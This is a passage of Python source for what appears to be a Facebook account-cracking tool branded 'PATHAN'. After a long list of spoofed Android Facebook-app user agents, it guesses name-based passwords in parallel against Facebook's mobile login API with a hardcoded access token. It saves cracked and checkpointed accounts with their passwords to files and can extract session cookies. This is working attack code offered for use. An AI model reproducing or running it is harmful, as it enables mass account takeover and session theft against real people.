Mozilla/5.0 (Linux; Android 11; SM-A125M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; M2101K7BG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 13; SM-A536E Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A305GT Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A225M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A105M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A107M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A235M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 9; ASUS_A001D Build/PPR1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 11; SM-A107M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; moto g(8) power lite Build/QODS30.163-17-29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A127M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 12; moto g52 Build/S1SRS32.38-132-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/344.0.0.10.83;]
Mozilla/5.0 (Linux; Android 7.0; SM-A510M Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 9; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 9; LM-X420 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; LM-X430 Build/QKQ1.200730.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606X Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.122 Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 9; moto g(8) power lite Build/POD29.348-23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 11; moto g(10) Build/RRBS31.Q1-3-48-20; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A305GT Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; M2007J3SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.185 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A526B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A022M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/344.0.0.10.83;]
Mozilla/5.0 (Linux; Android 12; SM-A125F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A226BR Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 9; JAT-L41 Build/HUAWEIJAT-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 9; SM-G611MT Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 6.0; CAM-L21 Build/HUAWEICAM-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A205G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; 2109119DG Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.35.106;]
Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 8.1.0; SM-J710MN Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]
Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; LM-Q730 Build/QKQ1.200216.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 8.0.0; SM-G570M Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; motorola edge 30 ultra Build/S3SQS32.16-72-14-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 8.0.0; SM-G570M Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A025M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; SM-A105M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]
Mozilla/5.0 (Linux; Android 13; SM-A325M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.185 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; LM-K200 Build/QKQ1.200311.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 11; NTN-LX1 Build/HONORNTN-L21CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; SM-G965F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A125M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; M2007J3SY Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; 2201117TY Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; 2201116PG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; M2003J15SC Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A325M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; CPH1951 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 12; SM-A135M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A226B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 9; moto g(6) plus Build/PPW29.116-16-29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A032M Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]
Mozilla/5.0 (Linux; Android 10; moto g(7) play Build/QPYS30.52-22-14; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 11; SM-A105M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; CPH1907 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 9; JAT-L41 Build/HUAWEIJAT-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A207M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; CPH2271 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 10; EML-L09 Build/HUAWEIEML-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; 2201117PG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; 2107113SG Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]
Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; RMX3201 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 12; SM-A536E Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; SM-J400M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
"""
####@-----FileM-----@####


def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'{oo("?")}Total Password? : ')
        if lp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(lp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    apps='y'
    os.system("clear")
    print(logo) 
    print('\033[1;92m='*25)
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/PATHAN-OK.txt")
    print('\033[1;92m='*25)
    print()
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;92mPATHAN-M1\033[1;91m]\033[1;92m {}-{} \033[1;91m[\033[1;92m{}\033[1;91m] \033[1;92mOK : \033[1;92m{} \033[1;92mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = "'[FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]'"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mPATHAN-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'  ')
                open('/sdcard/PATHAN-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;92mPATHAN-CP\033[1;91m] \033[1;92m'+acc+' \033[1;91m•\033[1;92m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/PATHAN-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   


 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;92mPATHAN-M2\033[1;91m]\033[1;92m {}-{} \033[1;91m[\033[1;92m{}\033[1;91m] \033[1;92mOK : \033[1;92m{} \033[1;92mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = "'[FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]'"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mPATHAN-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'  ')
                open('/sdcard/PATHAN-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;92mCookie\033[1;93m] \033[1;92m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;92mPATHAN-CP\033[1;91m] \033[1;92m'+acc+' \033[1;91m•\033[1;92m '+pword)
                cpacc.append(acc)
                open('/sdcard/PATHAN-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

    if m=='2':
        with speed(max_workers=30) as speede:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()  
      



####@-----Random-----@####
def andom():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o': 
        tpp = input(f'{oo("?")}Total Password? : ')
        totalpass.append('first')
        totalpass.append('last')
        if tpp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(tpp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/PATHAN-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;92mPATHAN-M1\033[1;91m]\033[1;92m {}-{} \033[1;91m[\033[1;92m{}\033[1;91m] \033[1;92mOK : \033[1;92m{} \033[1;92mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
